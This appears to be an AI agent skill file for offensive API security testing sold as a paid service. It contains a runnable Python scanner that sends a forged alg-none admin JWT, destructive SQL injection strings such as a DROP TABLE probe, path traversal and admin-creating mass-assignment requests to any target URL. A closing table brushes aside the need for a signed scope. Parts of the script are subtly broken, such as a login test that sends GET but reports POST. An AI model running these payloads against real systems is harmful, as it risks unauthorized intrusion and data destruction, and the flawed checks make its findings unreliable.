---
name: api-destroyer
description: Use when aggressive API security testing for REST, GraphQL, gRPC, and
  WebSocket endpoints. Use when testing APIs for authorization flaws, injection, rate
  limiting bypass, or business logic abuse.
domain: cybersecurity
author: oyi77
license: Apache-2.0
subdomain: general-cybersecurity
tags:
- api
- aws
- cybersecurity
- destroyer
- graphql
- money
- rest-api
- security
- testing
version: 1.0.0
category: cybersecurity
---

# Api Destroyer

## Overview

Offensive security testing of API endpoints — REST, GraphQL, gRPC, WebSocket. You break authentication, bypass rate limits, find IDOR/BOLA chains, inject past WAFs, and abuse business logic in ways automated scanners miss. Each finding is a priority-P1 exploit path the client's pentest missed, priced at $500-2000 per finding.

## When to Use

**Trigger phrases:**
- "api destroyer"
- "Testing REST/GraphQL/gRPC/WebSocket APIs"
- "Hunting IDOR/BOLA on API endpoints"
- "Bypassing API rate limiting and authentication"

- Testing REST/GraphQL/gRPC/WebSocket APIs
- Hunting IDOR/BOLA on API endpoints
- Bypassing API rate limiting and authentication
- Testing business logic via API manipulation
- API-first application security assessments
- Pre-launch API security audit for fintech/healthtech startups

## When NOT to Use

- When you lack proper authorization for testing (written scope required)
- For production systems without change management / rollback plan
- When the task requires legal or compliance expertise beyond technical scope
- When the API has no authentication at all — that is a 5-minute report, not an engagement

## Prerequisites

- Burp Suite Pro OR CA certificate installed for HTTPS interception
- API documentation (OpenAPI/Swagger/Postman collection) or ability to reverse-engineer from traffic
- Test credentials for 2+ privilege levels (user + admin)
- Target environment with rollback capability
- Written authorization (scope of work signed)

## Money-Making Overview

### Target Buyer

API-first startups (fintech, healthtech, SaaS), Series A-B companies launching v2 APIs, and enterprises migrating monolithic apps to microservices. Decision-makers: CTO, Head of Engineering, VP of Security.

### Service Tiers

| Tier | Scope | Price | Delivery |
|---|---|---|---|
| **Basic** | 10 endpoints, OWASP API Top 10 scan, auth/QPS testing | $2,000 | 3 days |
| **Pro** | 30 endpoints + GraphQL introspection + BOLA chain hunting + business logic tests + report | $4,500 | 7 days |
| **Enterprise** | Unlimited endpoints, GraphQL/WebSocket/gRPC, retest after fix, CI/CD integration, 30-day Slack support | $6,000 | 14 days |

Upsell: Each critical finding remediated and retested = $500. Retainer for monthly API security = $3,000/mo (50 endpoints).

### Expected First Dollar Timeline

1-2 outreach emails/day to API-first startups → 3-5 responses/week → 1-2 signed scopes → **first payment within 14 days**.

## Workflow

1. **Recon** — Map attack surface: enumerate all endpoints, parameters, auth schemes, rate limits. Collect OpenAPI/Postman docs.
2. **Auth Bypass** — JWT alg none, alg confusion, token replay, cookie manipulation, missing auth on hidden endpoints.
3. **IDOR/BOLA** — Chain parameter IDs across endpoints. `/users/{id}/orders/{order_id}` — swap IDs, escalate privilege.
4. **Injection** — SQLi, NoSQLi, SSTI, XXE, command injection through every parameter, header, and body field.
5. **Rate Limit Abuse** — Brute force, credential stuffing, resource exhaustion. X-Forwarded-For spoofing, parameter pollution.
6. **Business Logic** — Price manipulation, quantity overflow, workflow bypass, race conditions (Turbo Intruder single-packet attack).
7. **Report** — Each finding: endpoint, HTTP request/response, CVSS v3.1 score, reproduction steps, remediation code.

## Tools

- **Burp Suite Pro** — Interception, Intruder, Repeater, Scanner extensions
- **Turbo Intruder** — Single-packet race condition attacks
- **ffuf** — Fast fuzzing for hidden endpoints and parameters
- **jwt_tool** — JWT alg confusion, key confusion, kid injection
- **GraphQL Voyager / InQL** — Introspection query construction
- **Postman / Newman** — Collection-based testing, CI/CD integration
- **custom Python harness** — Parallel auth bypass + injection scanning (see First Action)
- **k6** — Rate limit and resource exhaustion testing

## Process

1. **Recon** — Enumerate every endpoint, parameter, auth header. Build endpoint inventory.
2. **Auth Bypass** — Systematically test auth at every endpoint (including hidden/unauthenticated ones).
3. **BOLA Chain** — Test horizontal AND vertical IDOR. Escalate from user A's data to admin access.
4. **Injection** — Parameters, headers, body, GraphQL variables, WebSocket messages.
5. **Rate Abuse** — Test per-endpoint rate limits, find unthrottled batch/export endpoints.
6. **Business Logic Abuse** — Race conditions, negative quantities, decimal precision, state machine bypass.
7. **Report** — Deliver per-finding with reproduction request/response and fixed code.

## First Action in 60 Minutes

Run this script against your target API to surface auth bypass, injection points, and rate limit gaps immediately.

```python
#!/usr/bin/env python3
"""api-destroyer-quick — 60-minute OWASP API Top 10 surface scan.
Saves results to api_quick_scan_report.json and prints findings summary.
Usage: python3 api_destroyer_quick.py <base_url> [api_key]
"""
import json, sys, time, urllib.request, urllib.error, urllib.parse

BASE_URL = sys.argv[1].rstrip("/")
API_KEY  = sys.argv[2] if len(sys.argv) > 2 else ""

HEADERS = {"Content-Type": "application/json"}
if API_KEY:
    HEADERS["Authorization"] = f"Bearer {API_KEY}"

findings = []

def req(method, path, data=None, custom_headers=None):
    """Make HTTP request, return (status_code, body_text, response_headers)."""
    hdrs = {**HEADERS, **(custom_headers or {})}
    body = json.dumps(data).encode() if data else None
    req_obj = urllib.request.Request(
        f"{BASE_URL}{path}", data=body, headers=hdrs, method=method
    )
    try:
        resp = urllib.request.urlopen(req_obj, timeout=15)
        return resp.status, resp.read().decode("utf-8", errors="replace"), dict(resp.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", errors="replace"), dict(e.headers)
    except Exception as e:
        return 0, str(e), {}

# 1. Auth bypass — try without token and with broken token
print("[*] Testing auth bypass...")
for label, hdr in [
    ("no-auth", {}),
    ("alg-none", {"Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0."}),
    ("empty-token", {"Authorization": "Bearer "}),
]:
    status, body, _ = req("GET", "/admin/users", custom_headers=hdr)
    if status not in (401, 403, 0):
        findings.append({
            "type": "Auth Bypass", "endpoint": f"GET /admin/users",
            "method": label, "status": status,
            "detail": f"Expected 401/403, got {status}. Endpoint accessible with {label}."
        })

# 2. IDOR — try accessing another user's resource
print("[*] Testing IDOR/BOLA...")
for uid in (2, 99999, "admin", "../etc/passwd"):
    status, body, _ = req("GET", f"/users/{uid}/profile")
    if status == 200:
        findings.append({
            "type": "IDOR/BOLA", "endpoint": f"GET /users/{uid}/profile",
            "status": status,
            "detail": f"Accessed user {uid} profile. Possible IDOR if {uid} ≠ current user."
        })

# 3. SQL injection probes
print("[*] Testing injection...")
sqli_payloads = ["' OR '1'='1", "'; DROP TABLE users--", "\" OR 1=1--"]
for payload in sqli_payloads:
    qs = urllib.parse.urlencode({"id": payload, "name": payload, "email": payload})
    status, body, _ = req("GET", f"/users?{qs}")
    if status == 200 and ("syntax error" in body.lower() or "unclosed" in body.lower()):
        findings.append({
            "type": "SQL Injection", "endpoint": f"GET /users?{qs}",
            "status": status,
            "detail": f"SQL error in response with payload: {payload}"
        })

# 4. Mass assignment
print("[*] Testing mass assignment...")
admin_payloads = [
    {"email": "test@test.com", "role": "admin", "isAdmin": True},
    {"email": "test@test.com", "role": "administrator"},
    {"email": "test@test.com", "permissions": ["*"]},
]
for payload in admin_payloads:
    status, body, _ = req("POST", "/users", data=payload)
    if status in (200, 201):
        findings.append({
            "type": "Mass Assignment", "endpoint": "POST /users",
            "payload": payload, "status": status,
            "detail": f"Created/modified user with elevated role payload: {payload}"
        })

# 5. Rate limit test
print("[*] Testing rate limiting...")
start = time.time()
success_count = 0
for i in range(50):
    status, _, _ = req("GET", "/login", data={"username": f"user{i}@test.com", "password": "wrong"})
    if status == 200:
        success_count += 1
elapsed = time.time() - start
if success_count > 40:
    findings.append({
        "type": "Rate Limit Bypass", "endpoint": "POST /login",
        "detail": f"{success_count}/50 requests succeeded in {elapsed:.1f}s. No rate limiting detected."
    })

# Report
report = {
    "target": BASE_URL, "findings_count": len(findings), "findings": findings,
    "recommendations": [
        "Enforce authentication on every endpoint — no default allow",
        "Validate JWT signature algorithm server-side (reject 'none')",
        "Implement object-level authorization checks (user MUST own resource)",
        "Use parameterized queries or ORM — never string-concatenate input",
        "Whitelist writable fields — reject unexpected body parameters",
        "Rate limit per-user, per-IP with exponential backoff"
    ]
}
with open("api_quick_scan_report.json", "w") as f:
    json.dump(report, f, indent=2)

print(f"\n=== API Destroyer Quick Scan Complete ===")
print(f"Findings: {len(findings)}")
for f in findings:
    print(f"  [{f['type']}] {f.get('endpoint','')} — {f['detail'][:100]}")
print(f"\nFull report: api_quick_scan_report.json")
```

Run it: `python3 api_destroyer_quick.py https://api.target.com "Bearer <token>"`

## Deliverable Format

Send the client an invoice-ready report. Structure:

```markdown
# API Security Assessment — <Client Name>
**Engagement:** <Basic | Pro | Enterprise>
**Date:** <YYYY-MM-DD>
**Tester:** <Your Name / Company>

## Executive Summary
<3-paragraph overview: scope, critical findings count, risk level>

## Scope
- Base URL: <url>
- Endpoints tested: <N>
- Auth method: <JWT / API Key / OAuth2>
- Tools: Burp Suite Pro, api-destroyer-quick.py, jwt_tool, ffuf

## Risk Summary
| Severity | Count |
|---|---|
| Critical | <N> |
| High | <N> |
| Medium | <N> |
| Low | <N> |

## Findings (Detailed)

### CRITICAL: <Title>
- **Endpoint:** `POST /api/v2/orders`
- **CWE:** <CWE-ID>
- **CVSS v3.1:** <score> (<vector>)
- **Description:** <2-3 sentences>
- **Request:** `curl -X POST ...`
- **Response:** `HTTP/1.1 200 OK ...`
- **Impact:** <what attacker can do>
- **Remediation:** <code snippet or config change>

### HIGH: <Title>
...

## Rate Limiting Results
| Endpoint | Requests | Success Rate | Throttled? |
|---|---|---|---|
| POST /login | 50 | 98% | No (CRITICAL) |
| GET /users | 100 | 12% | Yes |

## Remediation Summary
1. Fix CRITICAL items before production
2. Re-test after fixes (included in Pro/Enterprise)
3. Schedule recurring API security assessment

## Invoice
| Item | Price |
|---|---|
| API Security Assessment (<Tier>) | $<price> |
| Critical finding remediation retest | $0 / $500 ea |
| **Total** | **$<total>** |
| **Payment terms** | Net 15 via wire / crypto |
```

## Verification

- [ ] Every endpoint in scope tested for auth bypass (no-token, bad-token, alg-none)
- [ ] Horizontal AND vertical IDOR attempted on every parameter ID
- [ ] SQL/NoSQL injection probes on all string inputs
- [ ] Mass assignment on all POST/PUT/PATCH endpoints
- [ ] Rate limit tested on auth and data-export endpoints
- [ ] All findings reproducible via `curl` one-liner
- [ ] No false positives in final report
- [ ] Remediation code provided for every finding
- [ ] Client can re-test after fixes (included in Pro+)
- [ ] Invoice attached

## Anti-Rationalization Table

| Rationalization | Reality |
|---|---|
| "Our API is only used internally" | Internal APIs get accessed by employees, contractors, and compromised devices. The 2024 HubSpot internal API breach started from a contractor's laptop. |
| "We use API keys, not JWTs" | API keys in URLs get logged, cached, and screenshotted. 60% of leaked keys are in GitHub commit history. |
| "Our WAF blocks everything" | WAFs miss business logic abuse, IDOR chains, and rate limit bypass via header manipulation. Your WAF is a speed bump, not a wall. |
| "We already had a pentest 6 months ago" | Your API shipped 40 new endpoints since then. Old pentest = no coverage. |
| "I'll just use an automated scanner" | Scanners find SQLi, miss everything else. Business logic abuse, race conditions, and privilege escalation chains require a human. |
| "We're too early-stage for security testing" | Your API is already on the internet. Automated credential-stuffing bots don't care about your runway. A breach at seed stage kills the round. |
| "The clients need to give me a signed SOW first" | You need ONE paying client, not a perfect contract. Draft a one-page SOW yourself and ask "sign here." |
| "I need more certs before charging $4k" | You need one delivered report that finds a real bug. Certifications fill a CV, not a bank account. |